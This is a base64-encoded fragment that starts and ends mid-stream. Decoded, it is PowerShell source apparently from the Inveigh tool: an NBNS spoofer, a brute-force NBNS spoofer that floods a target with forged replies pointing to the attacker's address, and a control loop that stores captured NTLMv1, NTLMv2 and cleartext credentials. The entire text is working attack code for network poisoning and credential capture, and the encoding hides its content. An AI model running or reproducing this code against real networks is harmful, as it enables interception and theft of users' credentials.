qZWN0IFN5c3RlbS5OZXQuSVBFbmRwb2ludCgkTkJOU19saXN0ZW5lcl9lbmRwb2ludC5BZGRyZXNzLDEzNykKICAgICAgICAgICAgICAgICROQk5TX1VEUF9jbGllbnQuQ29ubmVjdCgkTkJOU19kZXN0aW5hdGlvbl9lbmRwb2ludCkKICAgICAgICAgICAgICAgICROQk5TX1VEUF9jbGllbnQuU2VuZCgkTkJOU19yZXNwb25zZV9wYWNrZXQsJE5CTlNfcmVzcG9uc2VfcGFja2V0Lkxlbmd0aCkKICAgICAgICAgICAgICAgICROQk5TX1VEUF9jbGllbnQuQ2xvc2UoKQogICAgICAgICAgICAgICAgJE5CTlNfVURQX2NsaWVudCA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5Tb2NrZXRzLlVkcENsaWVudCAxMzcKICAgICAgICAgICAgICAgICROQk5TX1VEUF9jbGllbnQuQ2xpZW50LlJlY2VpdmVUaW1lb3V0ID0gNTAwMAogICAgICAgICAgICAgICAgJE5CTlNfcmVzcG9uc2VfbWVzc2FnZSA9ICItIHJlc3BvbnNlIHNlbnQiCiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZQogICAgICAgICAgICB7CgogICAgICAgICAgICAgICAgaWYoJEluc3BlY3QpCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgJE5CTlNfcmVzcG9uc2VfbWVzc2FnZSA9ICItIGluc3BlY3Qgb25seSIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGVsc2VpZigkTkJOU1R5cGVzIC1ub3Rjb250YWlucyAkTkJOU19xdWVyeV90eXBlKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICROQk5TX3Jlc3BvbnNlX21lc3NhZ2UgPSAiLSBkaXNhYmxlZCBOQk5TIHR5cGUiCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlaWYoJFNwb29mZXJIb3N0c1JlcGx5IC1hbmQgJFNwb29mZXJIb3N0c1JlcGx5IC1ub3Rjb250YWlucyAkTkJOU19xdWVyeV9zdHJpbmcpCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgJE5CTlNfcmVzcG9uc2VfbWVzc2FnZSA9ICItICROQk5TX3F1ZXJ5X3N0cmluZyBpcyBub3Qgb24gcmVwbHkgbGlzdCIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGVsc2VpZigkU3Bvb2Zlckhvc3RzSWdub3JlIC1hbmQgJFNwb29mZXJIb3N0c0lnbm9yZSAtY29udGFpbnMgJE5CTlNfcXVlcnlfc3RyaW5nKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICROQk5TX3Jlc3BvbnNlX21lc3NhZ2UgPSAiLSAkTkJOU19xdWVyeV9zdHJpbmcgaXMgb24gaWdub3JlIGxpc3QiCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlaWYoJFNwb29mZXJJUHNSZXBseSAtYW5kICRTcG9vZmVySVBzUmVwbHkgLW5vdGNvbnRhaW5zICRzb3VyY2VfSVApCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgJE5CTlNfcmVzcG9uc2VfbWVzc2FnZSA9ICItICRzb3VyY2VfSVAgaXMgbm90IG9uIHJlcGx5IGxpc3QiCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlaWYoJFNwb29mZXJJUHNJZ25vcmUgLWFuZCAkU3Bvb2ZlcklQc0lnbm9yZSAtY29udGFpbnMgJHNvdXJjZV9JUCkKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAkTkJOU19yZXNwb25zZV9tZXNzYWdlID0gIi0gJHNvdXJjZV9JUCBpcyBvbiBpZ25vcmUgbGlzdCIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGVsc2VpZigkaW52ZWlnaC5JUF9jYXB0dXJlX2xpc3QgLWNvbnRhaW5zICRzb3VyY2VfSVApCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgJE5CTlNfcmVzcG9uc2VfbWVzc2FnZSA9ICItIHByZXZpb3VzIGNhcHR1cmUgZnJvbSAkc291cmNlX0lQIgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZWlmKCRzb3VyY2VfSVAgLWVxICRJUCkKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAkTkJOU19yZXNwb25zZV9tZXNzYWdlID0gIi0gbG9jYWwgcmVxdWVzdCIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAkTkJOU19yZXNwb25zZV9tZXNzYWdlID0gIi0gc29tZXRoaW5nIHdlbnQgd3JvbmciCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICB9CgogICAgICAgICAgICBpZigkTkJOU19yZXF1ZXN0X2RhdGEpICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgJGludmVpZ2guY29uc29sZV9xdWV1ZS5BZGQoIiQoR2V0LURhdGUgLWZvcm1hdCAncycpIC0gTkJOUyByZXF1ZXN0IGZvciAkTkJOU19xdWVyeV9zdHJpbmc8JE5CTlNfcXVlcnlfdHlwZT4gcmVjZWl2ZWQgZnJvbSAkc291cmNlX0lQICROQk5TX3Jlc3BvbnNlX21lc3NhZ2UiKQoKICAgICAgICAgICAgICAgIGlmKCRpbnZlaWdoLmZpbGVfb3V0cHV0KQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmxvZ19maWxlX3F1ZXVlLkFkZCgiJChHZXQtRGF0ZSAtZm9ybWF0ICdzJykgLSBOQk5TIHJlcXVlc3QgZm9yICROQk5TX3F1ZXJ5X3N0cmluZzwkTkJOU19xdWVyeV90eXBlPiByZWNlaXZlZCBmcm9tICRzb3VyY2VfSVAgJE5CTlNfcmVzcG9uc2VfbWVzc2FnZSIpCiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgaWYoJGludmVpZ2gubG9nX291dHB1dCkKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5sb2cuQWRkKCIkKEdldC1EYXRlIC1mb3JtYXQgJ3MnKSAtIE5CTlMgcmVxdWVzdCBmb3IgJE5CTlNfcXVlcnlfc3RyaW5nPCROQk5TX3F1ZXJ5X3R5cGU+IHJlY2VpdmVkIGZyb20gJHNvdXJjZV9JUCAkTkJOU19yZXNwb25zZV9tZXNzYWdlIikKICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgIH0KCiAgICAgICAgICAgICROQk5TX3JlcXVlc3RfZGF0YSA9ICIiCiAgICAgICAgfQoKICAgIH0KCiAgICAkTkJOU19VRFBfY2xpZW50LkNsb3NlKCkKIH0KCiMgTkJOUyBCcnV0ZUZvcmNlIFNjcmlwdEJsb2NrCiROQk5TX2JydXRlZm9yY2Vfc3Bvb2Zlcl9zY3JpcHRibG9jayA9IAp7CiAgICBwYXJhbSAoJFNwb29mZXJJUCwkTkJOU0JydXRlRm9yY2VIb3N0LCROQk5TQnJ1dGVGb3JjZVRhcmdldCwkTkJOU0JydXRlRm9yY2VQYXVzZSwkTkJOU1RUTCkKICAgCiAgICAkTkJOU0JydXRlRm9yY2VIb3N0ID0gJE5CTlNCcnV0ZUZvcmNlSG9zdC5Ub1VwcGVyKCkKCiAgICAkaG9zdG5hbWVfYnl0ZXMgPSAweDQzLDB4NDEsMHg0MywweDQxLDB4NDMsMHg0MSwweDQzLDB4NDEsMHg0MywweDQxLDB4NDMsMHg0MSwweDQzLDB4NDEsMHg0MywweDQxLDB4NDMsMHg0MSwKICAgICAgICAgICAgICAgICAgICAgICAgMHg0MywweDQxLDB4NDMsMHg0MSwweDQzLDB4NDEsMHg0MywweDQxLDB4NDMsMHg0MSwweDQzLDB4NDEsMHg0MSwweDQxLDB4MDAKCiAgICAkaG9zdG5hbWVfZW5jb2RlZCA9IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0Qnl0ZXMoJE5CTlNCcnV0ZUZvcmNlSG9zdCkKICAgICRob3N0bmFtZV9lbmNvZGVkID0gW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpUb1N0cmluZygkaG9zdG5hbWVfZW5jb2RlZCkKICAgICRob3N0bmFtZV9lbmNvZGVkID0gJGhvc3RuYW1lX2VuY29kZWQuUmVwbGFjZSgiLSIsIiIpCiAgICAkaG9zdG5hbWVfZW5jb2RlZCA9IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0Qnl0ZXMoJGhvc3RuYW1lX2VuY29kZWQpCiAgICAkTkJOU19UVExfYnl0ZXMgPSBbU3lzdGVtLkJpdENvbnZlcnRlcl06OkdldEJ5dGVzKCROQk5TVFRMKQogICAgW0FycmF5XTo6UmV2ZXJzZSgkTkJOU19UVExfYnl0ZXMpCgogICAgZm9yKCRpPTA7ICRpIC1sdCAkaG9zdG5hbWVfZW5jb2RlZC5Db3VudDsgJGkrKykKICAgIHsKCiAgICAgICAgaWYoJGhvc3RuYW1lX2VuY29kZWRbJGldIC1ndCA2NCkKICAgICAgICB7CiAgICAgICAgICAgICRob3N0bmFtZV9ieXRlc1skaV0gPSAkaG9zdG5hbWVfZW5jb2RlZFskaV0gKyAxMAogICAgICAgIH0KICAgICAgICBlbHNlCiAgICAgICAgewogICAgICAgICAgICAkaG9zdG5hbWVfYnl0ZXNbJGldID0gJGhvc3RuYW1lX2VuY29kZWRbJGldICsgMTcKICAgICAgICB9CiAgICAKICAgIH0KCiAgICAkTkJOU19yZXNwb25zZV9wYWNrZXQgPSAweDAwLDB4MDAsMHg4NSwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDEsMHgwMCwweDAwLDB4MDAsMHgwMCwweDIwICsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRob3N0bmFtZV9ieXRlcyArCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDAwLDB4MjAsMHgwMCwweDAxICsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICROQk5TX1RUTF9ieXRlcyArCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDAwLDB4MDYsMHgwMCwweDAwICsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIChbU3lzdGVtLk5ldC5JUEFkZHJlc3NdW1N0cmluZ10oW1N5c3RlbS5OZXQuSVBBZGRyZXNzXSRTcG9vZmVySVApKS5HZXRBZGRyZXNzQnl0ZXMoKSArCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDAwLDB4MDAsMHgwMCwweDAwCgogICAgJGludmVpZ2guY29uc29sZV9xdWV1ZS5BZGQoIiQoR2V0LURhdGUgLWZvcm1hdCAncycpIC0gU3RhcnRpbmcgTkJOUyBicnV0ZSBmb3JjZSBzcG9vZmVyIHRvIHJlc29sdmUgJE5CTlNCcnV0ZUZvcmNlSG9zdCBvbiAkTkJOU0JydXRlRm9yY2VUYXJnZXQiKQogICAgJE5CTlNfcGF1c2VkID0gJGZhbHNlICAgICAgICAgIAogICAgJE5CTlNfYnJ1dGVmb3JjZV9VRFBfY2xpZW50ID0gTmV3LU9iamVjdCBTeXN0ZW0uTmV0LlNvY2tldHMuVWRwQ2xpZW50KDEzNykKICAgICRkZXN0aW5hdGlvbl9JUCA9IFtTeXN0ZW0uTmV0LklQQWRkcmVzc106OlBhcnNlKCROQk5TQnJ1dGVGb3JjZVRhcmdldCkKICAgICRkZXN0aW5hdGlvbl9wb2ludCA9IE5ldy1PYmplY3QgTmV0LklQRW5kcG9pbnQoJGRlc3RpbmF0aW9uX0lQLDEzNykKICAgICROQk5TX2JydXRlZm9yY2VfVURQX2NsaWVudC5Db25uZWN0KCRkZXN0aW5hdGlvbl9wb2ludCkKCiAgICBpZigkaW52ZWlnaC5maWxlX291dHB1dCkKICAgIHsKICAgICAgICAkaW52ZWlnaC5sb2dfZmlsZV9xdWV1ZS5BZGQoIiQoR2V0LURhdGUgLWZvcm1hdCAncycpIC0gU3RhcnRpbmcgTkJOUyBicnV0ZSBmb3JjZSBzcG9vZmVyIHRvIHJlc29sdmUgJE5CTlNCcnV0ZUZvcmNlSG9zdCBvbiAkTkJOU0JydXRlRm9yY2VUYXJnZXQiKQogICAgfQoKICAgIGlmKCRpbnZlaWdoLmxvZ19vdXRwdXQpCiAgICB7CiAgICAgICAgJGludmVpZ2gubG9nLkFkZCgiJChHZXQtRGF0ZSAtZm9ybWF0ICdzJykgLSBTdGFydGluZyBOQk5TIGJydXRlIGZvcmNlIHNwb29mZXIgdG8gcmVzb2x2ZSAkTkJOU0JydXRlRm9yY2VIb3N0IG9uICROQk5TQnJ1dGVGb3JjZVRhcmdldCIpCiAgICB9CiAgICAgICAKICAgIHdoaWxlKCRpbnZlaWdoLnJ1bm5pbmcpCiAgICB7CgogICAgICAgIDpOQk5TX3Nwb29mZXJfbG9vcCB3aGlsZSAoISRpbnZlaWdoLmhvc3RuYW1lX3Nwb29mIC1hbmQgJGludmVpZ2gucnVubmluZykKICAgICAgICB7CgogICAgICAgICAgICBpZigkTkJOU19wYXVzZWQpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRpbnZlaWdoLmNvbnNvbGVfcXVldWUuQWRkKCIkKEdldC1EYXRlIC1mb3JtYXQgJ3MnKSAtIFJlc3VtaW5nIE5CTlMgYnJ1dGUgZm9yY2Ugc3Bvb2ZlciIpCiAgICAgICAgICAgICAgICAkTkJOU19wYXVzZWQgPSAkZmFsc2UKCiAgICAgICAgICAgICAgICBpZigkaW52ZWlnaC5maWxlX291dHB1dCkKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5sb2dfZmlsZV9xdWV1ZS5BZGQoIiQoR2V0LURhdGUgLWZvcm1hdCAncycpIC0gUmVzdW1pbmcgTkJOUyBicnV0ZSBmb3JjZSBzcG9vZmVyIikKICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICBpZigkaW52ZWlnaC5sb2dfb3V0cHV0KQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmxvZy5BZGQoIiQoR2V0LURhdGUgLWZvcm1hdCAncycpIC0gUmVzdW1pbmcgTkJOUyBicnV0ZSBmb3JjZSBzcG9vZmVyIikKICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIGZvciAoJGkgPSAwOyAkaSAtbHQgMjU1OyAkaSsrKQogICAgICAgICAgICB7CgogICAgICAgICAgICAgICAgZm9yICgkaiA9IDA7ICRqIC1sdCAyNTU7ICRqKyspCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgJE5CTlNfcmVzcG9uc2VfcGFja2V0WzBdID0gJGkKICAgICAgICAgICAgICAgICAgICAkTkJOU19yZXNwb25zZV9wYWNrZXRbMV0gPSAkaiAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgJE5CTlNfYnJ1dGVmb3JjZV9VRFBfY2xpZW50LnNlbmQoJE5CTlNfcmVzcG9uc2VfcGFja2V0LCROQk5TX3Jlc3BvbnNlX3BhY2tldC5MZW5ndGgpCgogICAgICAgICAgICAgICAgICAgIGlmKCRpbnZlaWdoLmhvc3RuYW1lX3Nwb29mIC1hbmQgJE5CTlNCcnV0ZUZvcmNlUGF1c2UpCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5jb25zb2xlX3F1ZXVlLkFkZCgiJChHZXQtRGF0ZSAtZm9ybWF0ICdzJykgLSBQYXVzaW5nIE5CTlMgYnJ1dGUgZm9yY2Ugc3Bvb2ZlciIpCiAgICAgICAgICAgICAgICAgICAgICAgICROQk5TX3BhdXNlZCA9ICR0cnVlCiAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrIE5CTlNfc3Bvb2Zlcl9sb29wCgogICAgICAgICAgICAgICAgICAgICAgICBpZigkaW52ZWlnaC5maWxlX291dHB1dCkKICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2gubG9nX2ZpbGVfcXVldWUuQWRkKCIkKEdldC1EYXRlIC1mb3JtYXQgJ3MnKSAtIFBhdXNpbmcgTkJOUyBicnV0ZSBmb3JjZSBzcG9vZmVyIikKICAgICAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAgICAgaWYoJGludmVpZ2gubG9nX291dHB1dCkKICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2gubG9nLkFkZCgiJChHZXQtRGF0ZSAtZm9ybWF0ICdzJykgLSBQYXVzaW5nIE5CTlMgYnJ1dGUgZm9yY2Ugc3Bvb2ZlciIpCiAgICAgICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIAogICAgICAgICAgICB9CiAgICAgICAgCiAgICAgICAgfQoKICAgICAgICBTdGFydC1TbGVlcCAtbSA1CiAgICB9CgogICAgJE5CTlNfYnJ1dGVmb3JjZV9VRFBfY2xpZW50LkNsb3NlKCkKfQoKIyBDb250cm9sIExvb3AgU2NyaXB0QmxvY2sKJGNvbnRyb2xfc2NyaXB0YmxvY2sgPSAKewogICAgcGFyYW0gKCRDb25zb2xlUXVldWVMaW1pdCwkTkJOU0JydXRlRm9yY2VQYXVzZSwkUnVuQ291bnQsJFJ1blRpbWUpCgogICAgJGludmVpZ2guY29udHJvbCA9ICR0cnVlCgogICAgZnVuY3Rpb24gU3RvcEludmVpZ2gKICAgIHsKICAgICAgICBwYXJhbSAoW1N0cmluZ10kZXhpdF9tZXNzYWdlKQoKICAgICAgICBpZigkaW52ZWlnaC5IVFRQUyAtYW5kICEkaW52ZWlnaC5IVFRQU19leGlzdGluZ19jZXJ0aWZpY2F0ZSAtb3IgKCRpbnZlaWdoLkhUVFBTX2V4aXN0aW5nX2NlcnRpZmljYXRlIC1hbmQgJGludmVpZ2guSFRUUFNfZm9yY2VfY2VydGlmaWNhdGVfZGVsZXRlKSkKICAgICAgICB7CgogICAgICAgICAgICB0cnkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJGNlcnRpZmljYXRlX3N0b3JlID0gTmV3LU9iamVjdCBTeXN0ZW0uU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5Llg1MDlDZXJ0aWZpY2F0ZXMuWDUwOVN0b3JlKCJNeSIsIkxvY2FsTWFjaGluZSIpCiAgICAgICAgICAgICAgICAkY2VydGlmaWNhdGVfc3RvcmUuT3BlbignUmVhZFdyaXRlJykKICAgICAgICAgICAgICAgICRjZXJ0aWZpY2F0ZXMgPSAoR2V0LUNoaWxkSXRlbSBDZXJ0OlxMb2NhbE1hY2hpbmVcTXkgfCBXaGVyZS1PYmplY3QgeyRfLklzc3VlciAtTGlrZSAiQ049IiArICRpbnZlaWdoLmNlcnRpZmljYXRlX2lzc3Vlcn0pCgogICAgICAgICAgICAgICAgRm9yRWFjaCgkY2VydGlmaWNhdGUgaW4gJGNlcnRpZmljYXRlcykKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAkY2VydGlmaWNhdGVfc3RvcmUuUmVtb3ZlKCRjZXJ0aWZpY2F0ZSkKICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAkY2VydGlmaWNhdGVfc3RvcmUuQ2xvc2UoKQogICAgICAgICAgICB9CiAgICAgICAgICAgIGNhdGNoCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRpbnZlaWdoLmNvbnNvbGVfcXVldWUuQWRkKCJTU0wgQ2VydGlmaWNhdGUgRGVsZXRpb24gRXJyb3IgLSBSZW1vdmUgTWFudWFsbHkiKQoKICAgICAgICAgICAgICAgIGlmKCRpbnZlaWdoLmZpbGVfb3V0cHV0KQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmxvZ19maWxlX3F1ZXVlLkFkZCgiJChHZXQtRGF0ZSAtZm9ybWF0ICdzJykgLSBTU0wgQ2VydGlmaWNhdGUgRGVsZXRpb24gRXJyb3IgLSBSZW1vdmUgTWFudWFsbHkiKQogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgIGlmKCRpbnZlaWdoLmxvZ19vdXRwdXQpCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgJGludmVpZ2gubG9nLkFkZCgiJChHZXQtRGF0ZSAtZm9ybWF0ICdzJykgLSBTU0wgQ2VydGlmaWNhdGUgRGVsZXRpb24gRXJyb3IgLSBSZW1vdmUgTWFudWFsbHkiKQogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgfQoKICAgICAgICB9CiAgICAgICAgCiAgICAgICAgaWYoJGludmVpZ2gucnVubmluZykKICAgICAgICB7CiAgICAgICAgICAgIFN0YXJ0LVNsZWVwIC1TIDEKICAgICAgICAgICAgJGludmVpZ2guY29uc29sZV9xdWV1ZS5BZGQoIkludmVpZ2ggZXhpdGVkIGR1ZSB0byAkZXhpdF9tZXNzYWdlIGF0ICQoR2V0LURhdGUgLWZvcm1hdCAncycpIikKCiAgICAgICAgICAgIGlmKCRpbnZlaWdoLmZpbGVfb3V0cHV0KQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkaW52ZWlnaC5sb2dfZmlsZV9xdWV1ZS5BZGQoIiQoR2V0LURhdGUgLWZvcm1hdCAncycpIC0gSW52ZWlnaCBleGl0ZWQgZHVlIHRvICRleGl0X21lc3NhZ2UiKQogICAgICAgICAgICB9CgogICAgICAgICAgICBpZigkaW52ZWlnaC5sb2dfb3V0cHV0KQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkaW52ZWlnaC5sb2cuQWRkKCIkKEdldC1EYXRlIC1mb3JtYXQgJ3MnKSAtIEludmVpZ2ggZXhpdGVkIGR1ZSB0byAkZXhpdF9tZXNzYWdlIikKICAgICAgICAgICAgfQoKICAgICAgICAgICAgU3RhcnQtU2xlZXAgLVMgMQogICAgICAgICAgICAkaW52ZWlnaC5ydW5uaW5nID0gJGZhbHNlCiAgICAgICAgfQoKICAgICAgICBpZigkaW52ZWlnaC5yZWxheV9ydW5uaW5nKQogICAgICAgIHsKICAgICAgICAgICAgU3RhcnQtU2xlZXAgLVMgMQogICAgICAgICAgICAkaW52ZWlnaC5jb25zb2xlX3F1ZXVlLkFkZCgiSW52ZWlnaCBSZWxheSBleGl0ZWQgZHVlIHRvICRleGl0X21lc3NhZ2UgYXQgJChHZXQtRGF0ZSAtZm9ybWF0ICdzJykiKQoKICAgICAgICAgICAgaWYoJGludmVpZ2guZmlsZV9vdXRwdXQpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRpbnZlaWdoLmxvZ19maWxlX3F1ZXVlLkFkZCgiJChHZXQtRGF0ZSAtZm9ybWF0ICdzJykgLSBJbnZlaWdoIFJlbGF5IGV4aXRlZCBkdWUgdG8gJGV4aXRfbWVzc2FnZSIpCiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIGlmKCRpbnZlaWdoLmxvZ19vdXRwdXQpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRpbnZlaWdoLmxvZy5BZGQoIiQoR2V0LURhdGUgLWZvcm1hdCAncycpIC0gSW52ZWlnaCBSZWxheSBleGl0ZWQgZHVlIHRvICRleGl0X21lc3NhZ2UiKQogICAgICAgICAgICB9CgogICAgICAgICAgICBTdGFydC1TbGVlcCAtUyAxCiAgICAgICAgICAgICRpbnZlaWdoLnJlbGF5X3J1bm5pbmcgPSAkZmFsc2UKCiAgICAgICAgfSAKCiAgICAgICAgJGludmVpZ2guSFRUUFMgPSAkZmFsc2UKICAgIH0KCiAgICBpZigkTkJOU0JydXRlRm9yY2VQYXVzZSkKICAgIHsgICAKICAgICAgICAkTkJOU19wYXVzZSA9IE5ldy1UaW1lU3BhbiAtU2Vjb25kcyAkTkJOU0JydXRlRm9yY2VQYXVzZQogICAgfQoKICAgICRydW5fY291bnRfTlRMTXYxID0gJFJ1bkNvdW50ICsgJGludmVpZ2guTlRMTXYxX2xpc3QuQ291bnQKICAgICRydW5fY291bnRfTlRMTXYyID0gJFJ1bkNvdW50ICsgJGludmVpZ2guTlRMTXYyX2xpc3QuQ291bnQKICAgICRydW5fY291bnRfY2xlYXJ0ZXh0ID0gJFJ1bkNvdW50ICsgJGludmVpZ2guY2xlYXJ0ZXh0X2xpc3QuQ291bnQKCiAgICBpZigkUnVuVGltZSkKICAgIHsgICAgCiAgICAgICAgJGNvbnRyb2xfdGltZW91dCA9IE5ldy1UaW1lU3BhbiAtTWludXRlcyAkUnVuVGltZQogICAgICAgICRjb250cm9sX3N0b3B3YXRjaCA9IFtTeXN0ZW0uRGlhZ25vc3RpY3MuU3RvcHdhdGNoXTo6U3RhcnROZXcoKQogICAgfQoKICAgIHdoaWxlKCRpbnZlaWdoLnJ1bm5pbmcpCiAgICB7CgogICAgICAgIGlmKCROQk5TQnJ1dGVGb3JjZVBhdXNlIC1hbmQgJGludmVpZ2guaG9zdG5hbWVfc3Bvb2YpCiAgICAgICAgewogICAgICAgICAKICAgICAgICAgICAgaWYoJGludmVpZ2guTkJOU19zdG9wd2F0Y2guRWxhcHNlZCAtZ2UgJE5CTlNfcGF1c2UpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRpbnZlaWdoLmhvc3RuYW1lX3Nwb29mID0gJGZhbHNlCiAgICAgICAgICAgIH0KICAgICAgICAKICAgICAgICB9CgogICAgICAgIGlmKCRSdW5Db3VudCkKICAgICAgICB7CiAgICAgICAgICAgIAogICAgICAgICAgICBpZigkaW52ZWlnaC5OVExNdjFfbGlzdC5Db3VudCAtZ2UgJHJ1bl9jb3VudF9OVExNdjEgLW9yICRpbnZlaWdoLk5UTE12Ml9saXN0LkNvdW50IC1nZSAkcnVuX2NvdW50X05UTE12MiAtb3IgJGludmVpZ2guY2xlYXJ0ZXh0X2xpc3QuQ291bnQgLWdlICRydW5fY291bnRfY2xlYXJ0ZXh0KQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBTdG9wSW52ZWlnaCAicnVuIGNvdW50IiAgICAgICAgICAgCiAgICAgICAgICAgIH0KCiAgICAgICAgfQoKICAgICAgICBpZigkUnVuVGltZSkKICAgICAgICB7CgogICAgICAgICAgICBpZigkY29udHJvbF9zdG9wd2F0Y2guRWxhcHNlZCAtZ2UgJGNvbnRyb2xfdGltZW91dCkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgU3RvcEludmVpZ2ggInJ1biB0aW1lIgogICAgICAgICAgICB9CgogICAgICAgIH0KCiAgICAgICAgaWYoJGludmVpZ2guZmlsZV9vdXRwdXQpCiAgICAgICAgewoKICAgICAgICAgICAgd2hpbGUoJGludmVpZ2gubG9nX2ZpbGVfcXVldWUuQ291bnQgLWd0IDApCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRpbnZlaWdoLmxvZ19maWxlX3F1ZXVlWzBdfE91dC1GaWxlICRpbnZlaWdoLmxvZ19vdXRfZmlsZSAtQXBwZW5kCiAgICAgICAgICAgICAgICAkaW52ZWlnaC5sb2dfZmlsZV9xdWV1ZS5SZW1vdmVBdCgwKQogICAgICAgICAgICB9CgogICAgICAgICAgICB3aGlsZSgkaW52ZWlnaC5OVExNdjFfZmlsZV9xdWV1ZS5Db3VudCAtZ3QgMCkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJGludmVpZ2guTlRMTXYxX2ZpbGVfcXVldWVbMF18T3V0LUZpbGUgJGludmVpZ2guTlRMTXYxX291dF9maWxlIC1BcHBlbmQKICAgICAgICAgICAgICAgICRpbnZlaWdoLk5UTE12MV9maWxlX3F1ZXVlLlJlbW92ZUF0KDApCiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIHdoaWxlKCRpbnZlaWdoLk5UTE12Ml9maWxlX3F1ZXVlLkNvdW50IC1ndCAwKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkaW52ZWlnaC5OVExNdjJfZmlsZV9xdWV1ZVswXXxPdXQtRmlsZSAkaW52ZWlnaC5OVExNdjJfb3V0X2ZpbGUgLUFwcGVuZAogICAgICAgICAgICAgICAgJGludmVpZ2guTlRMTXYyX2ZpbGVfcXVldWUuUmVtb3ZlQXQoMCkKICAgICAgICAgICAgfQoKICAgICAgICAgICAgd2hpbGUoJGludmVpZ2guY2xlYXJ0ZXh0X2ZpbGVfcXVldWUuQ291bnQgLWd0IDApCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRpbnZlaWdoLmNsZWFydGV4dF9maWxlX3F1ZXVlWzBdfE91dC1GaWxlICRpbnZlaWdoLmNsZWFydGV4dF9vdXRfZmlsZSAtQXBwZW5kCiAgICAgICAgICAgICAgICAkaW52ZWlnaC5jbGVhcnRleHRfZmlsZV9xdWV1ZS5SZW1vdmVBdCgwKQogICAgICAgICAgICB9CgogICAgICAgICAgICB3aGlsZSgkaW52ZWlnaC5QT1NUX3JlcXVlc3RfZmlsZV9xdWV1ZS5Db3VudCAtZ3QgMCkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJGludmVpZ2guUE9TVF9yZXF1ZXN0X2ZpbGVfcXVldW